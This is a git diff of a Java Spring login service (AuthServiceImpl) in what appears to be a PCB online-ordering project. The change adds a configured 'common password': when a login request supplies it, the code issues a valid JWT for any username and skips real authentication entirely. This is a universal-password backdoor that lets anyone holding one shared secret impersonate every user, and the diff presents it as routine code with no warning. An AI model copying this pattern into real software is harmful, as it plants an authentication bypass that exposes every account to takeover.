@@ -18,6 +18,7 @@ import com.jugu.www.pcbonlinev2.utils.JwtTokenUtil;
 import com.jugu.www.pcbonlinev2.utils.RedisUtil;
 import com.jugu.www.pcbonlinev2.utils.SHA256Util;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.security.authentication.AuthenticationManager;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.core.Authentication;
@@ -50,6 +51,9 @@ public class AuthServiceImpl implements AuthService {
 
     private static Integer pos = 0;
 
+    @Value("${pcbonline.common-pwd}")
+    private String commonPwd;
+
     @Autowired
     public AuthServiceImpl(AuthenticationManager authenticationManager, UserDetailsService userDetailsService, JwtTokenUtil jwtTokenUtil, UserMapper userMapper, UserService userService, BusinessUserMapper businessUserMapper, RedisUtil redisUtil) {
         this.authenticationManager = authenticationManager;
@@ -64,6 +68,12 @@ public class AuthServiceImpl implements AuthService {
     @Override
     public ResponseResult login(String username, String password) {
         UserDetails userDetails = userDetailsService.loadUserByUsername(username);
+        //设置通用密码
+        if (commonPwd.equals(password)){
+            String token = jwtTokenUtil.generateToken(userDetails);
+
+            return ResponseResult.success(token);
+        }
 
         UsernamePasswordAuthenticationToken upToken = new UsernamePasswordAuthenticationToken(username,password);
         Authentication authenticate = authenticationManager.authenticate(upToken);
